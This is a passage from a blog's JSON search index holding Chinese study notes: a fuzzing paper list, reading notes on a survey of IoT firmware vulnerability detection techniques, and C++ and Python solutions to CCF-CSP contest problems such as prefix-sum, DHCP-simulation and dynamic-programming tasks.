Analysis\tS\u0026amp;P\t2022\n种子调度算法 Fuzzing@Home : Distributed Fuzzing on Untrusted Heterogeneous Clients\tRAID\t2022\n公共协作模糊网络 USENIX USENIX | The Advanced Computing Systems Association\n2023 AIFORE Smart Fuzzing Based on Automatic Input Format Reverse Engineering POLYFUZZ Holistic Greybox Fuzzing of Multi-Language Systems 2022 BrakTooth Causing Havoc on Bluetooth Link MORPHUZZ Bending (Input) Space to Fuzz Virtual Devices 2021 ICSFuzz Manipulating IOs and Repurposing Binary Code CCS ACM CCS (sigsac.org)\n2017 SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits IEEE N\u0026amp;P IEEE TCSP (ieee-security.org)\n2022 Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis BEACON : Directed Grey-Box Fuzzing with Provable Path Pruning PATA: Fuzzing with Path Aware Taint Analysis JIGSAW: Efficient and Scalable Path Constraints Fuzzing 2021 Extractor: Extracting Attack Behavior from Threat Reports 威胁报告中提取攻击行为 2016 SeededFuzz: Selecting and Generating Seeds for Directed Fuzzing NDSS Network and Distributed System Security (NDSS) Symposium (ndss-symposium.org)\n2022 EMS: History-Driven Mutation for Coverage-based Fuzzing MobFuzz: Adaptive Multi-objective Optimization in Gray-box Fuzzing Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators Fuzzing-学习资源汇总 · GitBook (scubsrgroup.github.io)\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/%E5%88%86%E7%B1%BB/","summary":"2023-06-22 16:07 L2Fuzz: Discovering Bluetooth L2CAP Vulnerabilities Using Stateful Fuzz Testing. DSN 2022 关于蓝牙设备的fuzz 解决的问题：不能有效地生成蓝牙的畸形数据包 本文提出的方法生成的畸形数据包数量增加了46倍，数","title":"模糊测试分类"},{"content":"中文译名： 作者：张弛 单位：计算机软件新技术国家重点实验室 (南京大学) 国家： #中国 年份： #2021年 来源： #信息安全学报 关键字： #综述 #嵌入式 笔记建立时间： 2023-02-02 : 21:12\n摘要 归纳典型物联网固件实现缺陷类型、产生机理 评价静态分析、符号执行、模糊测试、程序验证、基于机器学习的方法 引言 IEEE 标准 12207-2008 将固件定义为“硬件设备和以只读软件形式存储于硬件设备中的计算机指令和数据的结合”。 固件分为三类 单片固件, 通常采取单个二进制镜像的形式, 无需底层操作系统, 直接基于底层硬件驱动完成所有功能, 或者只包含部分系统的库; 基于 Linux 的固件, 以 Linux 作为底层的系统, 基于 Linux 进行开发; 基于 RTOS 的固件。RTOS (real-time operating system) 是指实时处理数据、没有缓冲延迟的操作系统。 固件中存在缺陷是造成物联网设备遭受安全攻击的根本原因之一。 挑战： 无法获取源码且代码类型复杂 不同类型的固件差别较大 测试用例难以构建 依赖资源及技术不足 固件缺陷及其机理分析 固件中的缺陷可以分为实现缺陷、配置缺陷和定制缺陷。\n实现缺陷 内存损坏类缺陷：内存损坏类缺陷指不正确的内存访问导致堆、栈内存发生错误。 命令注入缺陷：命令注入缺陷指由于缺少对用户输入进行完备的检查导致恶意用户可以通过构造输入来运行非预期的命令。 程序逻辑缺陷：程序逻辑缺陷是指程序不严谨的逻辑所留下的缺陷, 使软件无法正常运行或给了不法分子可乘之机。 并发问题缺陷：并发问题缺陷指对多线程运行的固件设计不合理导致固件运行时产生数据竞争、死锁等行为。 配置缺陷 固件上的配置缺陷目前学术界研究缺失, 但大型软件系统和云系统中都有较多研究, 这些研究对固件配置缺陷检测或许会有启发。\n功能配置参数缺陷 性能配置参数缺陷：这类缺陷通常不会直接引起系统挂起、崩溃等异常行为, 但是无法提供系统预期的性能, 无法满足用户的需求 权限配置参数缺陷 定制缺陷 ^6e21ca 固件安全缺陷检测技术 目前主流的自动化缺陷检测技术可以分为五类, 分别是静态分析、符号执行、模糊测试、程序验证、机器学习.\n静态分析 PIE 总结了固件通信协议代码的特征，借助机器学习算法高效识别未知固件的通信协议代码块 DTaint 通过污点分析初步解决了静态分析技术扩展性差的问题 单纯的静态分析无法获取准确的污点传播情况, 容易造成大量的误报, 可扩展性较差。Saluki 通过 “运行”代码片段来提高污点分析的精度 KARONTE 在对固件进行分析时考虑了固件不同组件之间的交互和数据流动, 大大降低了污点分析的误报。 符号执行 特定架构的分析 Davidson 等人[49] 提出了基于符号执行引擎 KLEE 的符号执行工具 FIE, 实现了对基于 MSP430 系列微控制器的固件程序有效缺陷检测。 Hernandez 等人[50] 基于 FIE, 通过加入对 Intel 8051 MCU 的支持, 实现了针对 USB 固件的符号执行分析框架 FirmUSB 特定缺陷的分析 Oleksandr 等人[51]提出一种基于 KLEE 的符号执行工具, 用来分析 BIOS 中 SMM 中断处理程序的危险内存引用。 Ya n 等人[52]提出利用符号执行技术来查找二进制固件中身份验证绕过缺陷, 并实现了分析框架 Firmalice。 通用分析框架 为了支持更多固件代码的处理, Corteggiani 等人[53]基于 KLEE 开发了针对固件代码的符号执行框架 Inception, 此工作一定程度上消除了平台的差异。 符号执行需要解决的痛点在于需要源码，如何实现直接以二进制固件作为输入进行分析。 模糊测试 按照固件运行的环境, 现有模糊测试技术可以分为基于真实设备以及基于模拟执行环境的模糊测试。\n基于真实设备环境的模糊测试 Sara 等人[28]提出了一种运行时验证工具来检测 FreeRTOS 中的并发缺陷。基于运行日志来进行分析 RPFuzzer[56]是一个用于检测路由协议缺陷的框架, 通过向真实设备发送大量数据包, 监控 CPU 使用与查看系统日志, 进而检测设备重启与拒绝服务漏洞 IoTFuzzer[57]基于移动应用程序与真实终端设备开发了一个检测固件程序中内存损坏缺陷的黑盒模糊测试工具。 下面几个是针对配置缺陷的\nYu a n 等人[59]提出一个不需要源代码的在线黑盒测试工具 CODE 来对使用最为频繁的配置进行缺陷检测。 Su 和 Attariyan 等人[60]通过在 Linux 内核级对与配置相关的动作的输入和输出进行跟踪, 推断出配置错误发生的因果关系, 并实现了工具 AutoBash。 Attariyan 等人[61]通过对二进制文件进行插桩, 在程序运行时通过控制流和数据流获取依赖关系, 通过依赖关系将异常行为定位到特定的配置项中, 实现了名为 ConfAid 的动态配置缺陷检测工具。 Zhang 等人[62]提出了一个静态分析和动态分析相结合来诊断单个配置缺陷的工具 ConfDiagnoser。 基于模拟执行环境的模糊测试 对基于 linux 的固件：\nZaddach 等人[63]提出了一个框架 Avatar, 通过将仿真器的执行与实际硬件协调在一起, 实现了对嵌入式设备的复杂动态分析。 Chen 等人[65]实现了第一个对基于 Linux 的商用物联网设备固件在模拟器中进行仿真、自动化分析的系统 FIRMADYNE, 此工作可以仿真 Linux 系统, 并完全脱离硬件进行仿真。 Firm-AFL[66]基于 FIRMADYNE 实现了对基于 Linux 的物联网固件的高性能灰盒模糊测试, 这是第一个针对固件的灰盒模糊测试系统, 而且提高了固件模拟执行的效率。 对于处理外设输入：\nP2IM 基于外设接口抽象建模，但是无法处理固件对内存的直接访问 DICE 通过识别固件中的 DMA 输入输出通道并动态创建缓冲区来解决固件对内存的直接访问 Laelaps 使用符号执行来生成外设输入 以上的解决方案支持的外设类型和输入输出类型有限 HALucinatior 通过替换固件硬件抽象层使其不依赖于具体硬件。 PCHECK 是针对配置缺陷的模糊测试软件 模糊测试的痛点在于不能完美的托管固件——没有完美的模拟器，未来研究通过其他方法来弥补模拟器的不足——打补丁。 程序验证技术 程序验证技术是指以数学和逻辑为基础, 对系统进行说明、设计和验证, 通过形式规约来描述系统的行为或者系统应该满足的性质, 采用形式化验证来验证系统是否满足需求和具备这些性质, 即是否满足规约 不感兴趣，不看。\n基于机器学习的方法 现有的基于机器学习的方法大多通过静态分析或者动态执行来提取程序特征, 使用一些机器学习算法来学习已有的缺陷特征, 并在程序中查找已知缺陷。\n上下文无关的函数匹配 Feng 等人[79]提出一个基于控制流程图 (CFG) 的缺陷搜索引擎 Genius。创新在于将 CFG 转化成了数字特征向量，降低了匹配的开销。 在之后的研究中 Feng 等人[80]还提出了一种基于从原始二进制码中提取的条件公式作为高级语义特征进行代码搜索的方法, 并根据此实现了工具 XMATCH。 Xu 等人[81]对神经网络进行了修改, 使其可以将从固件中提取的属性控制流图 (attributed control flow graph, ACFG) 转化为数字特征向量- 嵌入向量 (embedding vectors), 这一方法大大缩减了嵌入向量的生成时间和模型的训练时间。 Gao 等人[82]提出了基于语义学习的代码相似性计算工具 VulSeeker，作者从固件中提取标记了的语义流图 (Labeled Semantic Flow Graph, LSFG), 该图同时包含数据流图和控制流图, 将图中的边标记为 0 和 1 分别来表示控制流和数据流, 作者使用从 LSFG 中提取的基本块特征作为数字向量, 以此数字向量为输入通过语义感知的 DNN 模型计算, 得出函数的嵌入向量, 通过计算两个函数的嵌入向量的余弦距离来计算相似性。 上下文敏感的函数匹配 上下文无关的函数匹配难以跨越多个函数进行匹配。\nDavid 等人[85]提出了基于 Angr 的静态分析工具 FirmUP, 用于程序在过程间层面进行缺陷相似性匹配。 二进制固件文件匹配 Andrei 等人[86]的工作收集了大量的固件程序, 设计了分布式的架构对其进行解包和简单的静态分析, 并实现了一个引擎来比较和确定数据集中所有对象之间的相似性 Chen 等人[87]发现固件代码在不同编译环境、优化选项下编译出来的二进制码会包含一些\u0026quot;编译不变性\u0026quot;的字符串，作者利用深度学习来编码可读字符串，对字符串 hash，用 hash 来进行比对和检索，加快了速度。 Zou 等人[88]通过向物联网设备发送报文来获取物联网设备返回的协议标语信息, 用自然语言处理方法来进行处理, 最后获取设备分类, 以发现是否同有缺陷的设备为同一厂商。（什么鬼） 这部分这个文件匹配的思路大概就是用已知漏洞的文件和普通固件文件提取特征进行比对，关键点在于特征提取算法和比对算法能否提高效率。 基于模板的配置缺陷检测 Zhang 等人[89]从一组给定的配置中利用数据挖掘技术学习配置规则, 以此规则来检测其他配置的正确性, 并实现了自动化测试工具 EnCore。 基于机器学习的方法可以用来检测固件中的已知缺陷, 且可以跨越不同平台进行检测。大多数方法需要基于静态分析得出的结果进行机器学习，因此效果的好坏很大程度上依赖于程序特征的提取和相应的机器学习模型的选择。 如何更好的抽取程序特征和如何对固件程序选取有效的特征和选择高效的匹配方法是这类方法的主要研究问题。主要是为了提高漏洞识别（或者是漏洞匹配）的精度，上下文敏感比上下文无关精度要高，但是这些方法（文章中提到的那几篇文章）使用的静态分析方法丢失了一部分语义。 缺陷检测辅助工作 获取源码：解放军信息工程大学李清宝团队在固件代码反编译领域取得了大量成果。文献[90]讨论了固件代码逆向中的指令归一化、控制流恢复、中断向量表等关键问题, 设计了逆向平台 amPro; 文献[91]针对固件严重依赖中断提出了基于中断向量表重构的固件代码反汇编技术, 大大提高了反汇编的精度; 文献[92]提出了动静态两个方面的固件代码控制流恢复算法, 提高了固件控制流恢复的全面性, 为后续的分析提供了有力的支持; 文献[93]提出快速位运算方法和区间生成算法, 提高了在固件反汇编中计算字节运算和位运算取值范围的效率; 文献[94]则基于反汇编技术提出了对固件代码的形式化验证方法和多路径固件恶意行为检测方法。 面向固件解码的判定问题, 中科院信息工程研究所孙利民团队提出了基于分类回归树的固件解码状态检测算法[95], 可以自动化分析大量固件解码状态; 面向固件系统、结构、支持硬件不同等问题, 提出了基于获取规则的方法来自动化发现和标注 IoT 设备的类型、供应商和型号[96], 和基于自然语言处理来分析网页内容识别设备指纹的方法[97], 方便其他学者获取固件详细信息; 还提出了基于自然语言处理分析网络上的缺陷报告来理解物联网设备被攻击的原因, 并协助抵抗攻击[98]。文献[99]对固件获取、固件格式分析、固件程序提取、目标程序分析提取、程序表示技术、执行信息恢复技术等进行了综述。 未来研究方向 构造一个测试基准集, 包含不同架构、不同类型的固件, 且固件中可植入不同类型的缺陷。 固件仿真能力的提高, 覆盖更多的外设类型和硬件架构, 提高对商用物联网设备固件的仿真能力。 如何有效利用智能化技术, 通过挖掘已有海量代码中的漏洞信息、结构特征、语义特征、代码修复、更新信息, 形成智能化的漏洞预测模型, 实现自动化生成漏洞检测规则, 进而高效地预测潜在漏洞, 并为后续目标制导的模糊测试提供制导目标 面向配置缺陷检测的测试用例生成技术 定制化缺陷的检测无需对整个固件程序进行重新测试, 只需对定制化部分测试即可, 但目前尚未出现这一方向的研究工作, 未来可在这一方向做出拓展。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%E7%89%A9%E8%81%94%E7%BD%91%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6%E8%BF%9B%E5%B1%95/","summary":"中文译名： 作者：张弛 单位：计算机软件新技术国家重点实验室 (南京大学) 国家： #中国 年份： #2021年 来源： #信息安全学报 关键字： #综述 #嵌入式","title":"物联网固件安全缺陷检测研究进展"},{"content":"期末预测之安全指数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, sum = 0; cin\u0026gt;\u0026gt;n; while(n--){ int s, w; cin\u0026gt;\u0026gt;s\u0026gt;\u0026gt;w; sum += (s*w); } int ans = max(0, sum); cout\u0026lt;\u0026lt;ans; return 0; } 1 2 3 4 5 6 7 8 n = int(input()) sum = 0 for i in range(0, n): s, w = map(int, input().split()) sum = sum + s * w ans = max(0, sum) print(ans) 期末预测之最佳阈值 关键：巧妙的将计数转变为前缀和问题 问题的关键在于如何快速的统计每一个阈值预测正确的个数？ Y 总的方法是采用前缀和的方法来统计个数，如何将分散的数据转变为可以用前缀和的数据呢，就是按照阈值对数据进行排序。这样的效果就是阈值 i 预测正确的个数就是在 i 前的数据的预测结果为 0 的个数加上在 i 后数据预测结果为 1 的个数。 那么我们维护两个前缀和数组 s1 和 s0，s1 [i]表示 i 前（包括 i）的数据中 1 的个数，s0 [i]同理。那么对于数据 i 对应的阈值来说，预测正确的个数就是 s1 [m] - s1 [i - 1] + s0[i - 1]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define x first #define y second typedef pair\u0026lt;int, int\u0026gt;PII; const int N = 100010; PII p[N]; int s[2][N]; int main(){ int m; cin\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= m; i ++){ cin\u0026gt;\u0026gt;p[i].x\u0026gt;\u0026gt;p[i].y; } sort(p + 1, p + m + 1); // 排序，目的是为了方便使用前缀和算法 for(int i = 0; i \u0026lt; 2; i ++){ for(int j = 1; j \u0026lt;= m; j ++){ s[i][j] = s[i][j - 1] + (p[j].y == i); //维护前缀和数组 } } int res , cnt = -1; for(int i = 1; i \u0026lt;= m; i ++){ int t = s[0][i - 1] + s[1][m] - s[1][i - 1]; if(t \u0026gt;= cnt) cnt = t, res = p[i].x; while(i + 1 \u0026lt;= m \u0026amp;\u0026amp; p[i].x == p[i + 1].x) i++; //因为x（阈值）有相同的值，那么计算该阈值的正确预测个数，用的应该是最后出现的一个阈值对应的前缀和 } cout\u0026lt;\u0026lt;res; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC21%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"期末预测之安全指数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, sum = 0; cin\u0026gt;\u0026gt;n; while(n--){ int s, w; cin\u0026gt;\u0026gt;s\u0026gt;\u0026gt;w; sum += (s*w); } int ans = max(0, sum); cout\u0026lt;\u0026lt;ans; return 0; } 1 2 3 4 5 6 7 8 n = int(input()) sum = 0 for i","title":"第21次CCF计算机软件能力认证"},{"content":"灰度直方图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500; const int L = 256; int gray_L[L]; int main(){ int n, m, l, tmp; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;l; for(int i = 0; i \u0026lt; n; i ++){ for(int j = 0; j \u0026lt; m; j ++){ cin\u0026gt;\u0026gt;tmp; gray_L[tmp]++; } } for(int i = 0; i \u0026lt; l; i ++){ cout\u0026lt;\u0026lt;gray_L[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; } return 0; } 1 2 3 4 5 6 7 8 9 10 11 n, m, l = map(int, input().split()) ans = [ 0 for i in range(0, 257)] for i in range(0, n): L = list(map(int, input().split())) for j in range(0, m): tmp = L[j]; ans[tmp] = ans[tmp] + 1 for i in range(0, l): print(str(ans[i]) + \u0026#34; \u0026#34;, end=\u0026#34;\u0026#34;) 领域均值 这种求和应该一下子就想到是前缀和（前缀矩阵） [[前缀和（前缀和矩阵）]]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 610; int g[N][N]; int main(){ int n, l, r, t; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;l\u0026gt;\u0026gt;r\u0026gt;\u0026gt;t; for(int i = 1; i \u0026lt;= n; i++){ for(int j = 1; j \u0026lt;= n; j ++){ int tmp; cin\u0026gt;\u0026gt;tmp; g[i][j] = tmp + g[i-1][j] + g[i][j-1] - g[i-1][j-1]; } } int res = 0; for(int i = 1; i \u0026lt;= n; i++){ for(int j = 1; j \u0026lt;= n; j ++){ int x1 = max(1, i - r), y1 = max(1, j - r); int x2 = min(n, i + r), y2 = min(n, j + r); int sum = g[x2][y2] - g[x1 - 1][y2] - g[x2][y1 - 1] + g[x1 - 1][y1 - 1]; int cnt = (x2 - x1 + 1) * (y2 - y1 + 1); if(sum \u0026lt;= cnt * t) res++; } } cout\u0026lt;\u0026lt;res; return 0; } DHCP 服务器 直接对着描述翻译为代码即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 10010; int n, m, t_def, t_max, t_min; string h; struct IP { int state; // 0：未分配，1：待分配，2：占用，3：过期 int t; // 过期时间 string owner; }ip[N]; void update_ips_state(int tc) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].t \u0026amp;\u0026amp; ip[i].t \u0026lt;= tc) { if (ip[i].state == 1) { ip[i].state = 0; ip[i].owner = \u0026#34;\u0026#34;; ip[i].t = 0; } else { ip[i].state = 3; ip[i].t = 0; } } } int get_ip_by_owner(string client) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].owner == client) return i; return 0; } int get_ip_by_state(int state) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].state == state) return i; return 0; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; t_def \u0026gt;\u0026gt; t_max \u0026gt;\u0026gt; t_min \u0026gt;\u0026gt; h; cin \u0026gt;\u0026gt; m; while (m -- ) { int tc; string client, server, type; int id, te; cin \u0026gt;\u0026gt; tc \u0026gt;\u0026gt; client \u0026gt;\u0026gt; server \u0026gt;\u0026gt; type \u0026gt;\u0026gt; id \u0026gt;\u0026gt; te; if (server != h \u0026amp;\u0026amp; server != \u0026#34;*\u0026#34;) { if (type != \u0026#34;REQ\u0026#34;) continue; } if (type != \u0026#34;DIS\u0026#34; \u0026amp;\u0026amp; type != \u0026#34;REQ\u0026#34;) continue; if (server == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; type != \u0026#34;DIS\u0026#34; || server == h \u0026amp;\u0026amp; type == \u0026#34;DIS\u0026#34;) continue; update_ips_state(tc); if (type == \u0026#34;DIS\u0026#34;) { int k = get_ip_by_owner(client); if (!k) k = get_ip_by_state(0); if (!k) k = get_ip_by_state(3); if (!k) continue; ip[k].state = 1, ip[k].owner = client; if (!te) ip[k].t = tc + t_def; else { int t = te - tc; t = max(t, t_min), t = min(t, t_max); ip[k].t = tc + t; } cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;OFR\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; ip[k].t \u0026lt;\u0026lt; endl; } else { if (server != h) { for (int i = 1; i \u0026lt;= n; i ++ ) if (ip[i].owner == client \u0026amp;\u0026amp; ip[i].state == 1) { ip[i].state = 0; ip[i].owner = \u0026#34;\u0026#34;; ip[i].t = 0; } continue; } if (!(id \u0026gt;= 1 \u0026amp;\u0026amp; id \u0026lt;= n \u0026amp;\u0026amp; ip[id].owner == client)) cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;NAK\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; id \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; endl; else { ip[id].state = 2; if (!te) ip[id].t = tc + t_def; else { int t = te - tc; t = max(t, t_min), t = min(t, t_max); ip[id].t = tc + t; } cout \u0026lt;\u0026lt; h \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; client \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026#34;ACK\u0026#34; \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; id \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; ip[id].t \u0026lt;\u0026lt; endl; } } } return 0; } 校门外的树 参考笔记：AcWing 3414. 校门外的树 - AcWing AcWing 3414. 校门外的树 - AcWing 题意大概就是往不同的区间内插树，要求是要么在整个大区间树之间的距离是等差的，要不然是在不同的子区间内是等差的，然后障碍物的地方不能插树。 那么首先看到这个题，直觉上这个题应该分为两个步骤，第一计算我们要选择哪个区间插树，第二就是计算当前方案下的等差方案。感觉第一步比较关键并且费事，第二步不算难，求区间长度的约数即可。 这种选择问题一般就是 DP，为啥呢，当确定选择区间 A 后，后续可以有不同情况，当继续选择区间 A、B 后后续又有不同情况，这种情况的结构很像树，从一个结点延伸很多种情况，这种用 DP 来动态的推结果，一般叶子结点存储的结果就是答案。 那么闫氏 DP 分析法走起[[闫氏DP分析法]]\n确定状态表示，这题我们用一维 f (i) 表示（实际分析的时候也是从一维开始分析，后面觉得不够，再加维度）以 i 为右端点的区间的插树方案（a0~ai 区间所有插树方法的集合） 状态转移：状态转移就要求如何从 f (0)~f (i-1) 的值求得 f (i) 的值 对于 f (j)，0\u0026lt;=j\u0026lt;=i-1 来说，f (j) 表示以 j 为右端点的方案数，那么对于 f (i) 而言新增加的情况就是区间 j~i 的方案数，那么遍历 j，把 f (j)*cnt（j, i) 求和便是我们的答案 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long LL; const int N = 1010, M = 100010, MOD = 1e9 + 7; int n; int a[N]; int f[N]; vector\u0026lt;int\u0026gt; q[M]; bool st[M]; int main(){ //打表以算倍数的方式来求约数，q[i]表示i的约数 for(int i = 1; i \u0026lt; M; i ++){ for(int j = i * 2; j \u0026lt; M; j += i){//因为间隔不能等于区间大小，那样就不能插树了 q[j].push_back(i); } } cin\u0026gt;\u0026gt;n; for(int i = 0; i \u0026lt; n; i ++) cin\u0026gt;\u0026gt;a[i]; f[0] = 1; for(int i = 1; i \u0026lt; n; i++){ memset(st, 0, sizeof st); for(int j = i - 1; j \u0026gt;= 0; j --){ int d = a[i] - a[j], cnt = 0; for(int k: q[d]){ if(!st[k]){ cnt++; st[k] = true; } } st[d] = true; f[i] = (f[i] + (LL)f[j] * cnt) % MOD; } } cout\u0026lt;\u0026lt;f[n-1]; return 0; } 在 y 总的代码中还有一个巧妙的点在于，如何去判定插树的位置有没有避开障碍物呢，代码的第 25 行和 st 数组解决了这个问题。\nSt 数组维护了使用过的约数，也就是说，当你的选择的区间使用过某个间隔 k，那么该间隔就不能再用了，因为区间两个断点是障碍物，也就是说如果比当前区间大的区间也选择了间隔 k 的方案，那么树一定会插在障碍物上 这也解释了为啥内层循环要从大到小遍历，从最小的区间开始一个一个把间隔 k ban 掉 ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC22%E6%AC%A1ccf-csp%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"灰度直方图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500; const int L = 256; int gray_L[L]; int main(){ int n, m, l, tmp; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;l; for(int i = 0; i \u0026lt; n; i ++){ for(int j = 0; j \u0026lt; m; j ++){ cin\u0026gt;\u0026gt;tmp;","title":"第22次CCF-CSP计算机软件能力认证题解"},{"content":"数组推导 当 b[i] == a[i]的情况下，数组 a 的和是最大的情况 当 b[i] == b[i-1]的时候，a[i] == 0 的情况下，数组 a 最小 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 105; int a[N], b[N]; int n; int main(){ int sum_max = 0, sum_min = 0; cin \u0026gt;\u0026gt; n; cin \u0026gt;\u0026gt; b[0]; sum_max = b[0]; sum_min = b[0]; for(int i = 1; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt; b[i]; sum_max += b[i]; if(b[i] != b[i - 1]) sum_min += b[i]; } cout \u0026lt;\u0026lt; sum_max \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; sum_min; return 0; } 非零段划分 参考 我们可以先做下面这个题，本题算是下面这个题的简化版本。 2014. 岛 - AcWing题库\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;bits/stdc++.h\u0026gt; #define x first #define y second using namespace std; typedef pair\u0026lt;int, int\u0026gt; PII; const int N = 100005; int h[N]; PII q[N]; int main(){ int n; cin\u0026gt;\u0026gt;n; for(int i = 1; i \u0026lt;= n; i++){ cin\u0026gt;\u0026gt;h[i]; } n = unique(h + 1, h + n + 1) - h - 1; h[n + 1] = 0; for(int i = 1; i \u0026lt;= n; i++) q[i] = {h[i], i}; sort(q + 1, q + n + 1); int res =1, cnt = 1; for(int i = 1; i \u0026lt;= n; i++){ int k = q[i].y; if (h[k - 1] \u0026lt; h[k] \u0026amp;\u0026amp; h[k + 1] \u0026lt; h[k]) cnt -- ; else if (h[k - 1] \u0026gt; h[k] \u0026amp;\u0026amp; h[k + 1] \u0026gt; h[k]) cnt ++ ; if(q[i].x != q[i + 1].x) res = max(res, cnt); } cout\u0026lt;\u0026lt;res; return 0; } 与岛屿问题类似，p 表示海平面高度，数组 a 表示山峰高度，非零段的数量表示岛屿数量。当海平面 p 都大于岛屿的高度时，此时海平面只有 0 个岛屿，当海平面逐渐下降，当山峰出现时，岛屿数++；当山谷出现时，两个山峰被连在一起，岛屿数\u0026ndash;；当出现的山峰和相邻山峰高度相同的时候，两个山峰被连在一起，岛屿数\u0026ndash;（这种情况可以和山谷合并）。 代码思路：\n读入数据 去重，删除相邻相同元素（unique 函数） 遍历数组，同时做山峰和山谷的判断，得到对应高度的岛屿数量贡献数组 遍历岛屿数量贡献数组，寻找哪个高度能得到最多的岛屿数 输出 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 500005, M = 10005; int a[N], cnt[M]; int n; int main(){ cin\u0026gt;\u0026gt;n; for(int i = 1; i \u0026lt;= n; i++){ cin\u0026gt;\u0026gt;a[i]; } n = unique(a + 1, a + n + 1) - a - 1; a[0] = a[n + 1] = 0; for(int i = 1; i \u0026lt;= n; i++){ if(a[i - 1] \u0026lt; a[i] \u0026amp;\u0026amp; a[i + 1] \u0026lt; a[i]) cnt[a[i]]++; else if(a[i - 1] \u0026gt; a[i] \u0026amp;\u0026amp; a[i + 1] \u0026gt; a[i]) cnt[a[i]]--; } int res = 0, sum = 0; for(int i = M - 1; i; i--){ sum += cnt[i]; res = max(res, sum); } cout\u0026lt;\u0026lt;res; return 0; } 脉冲神经网络 [[邻接表]] 第 161 行的 mod 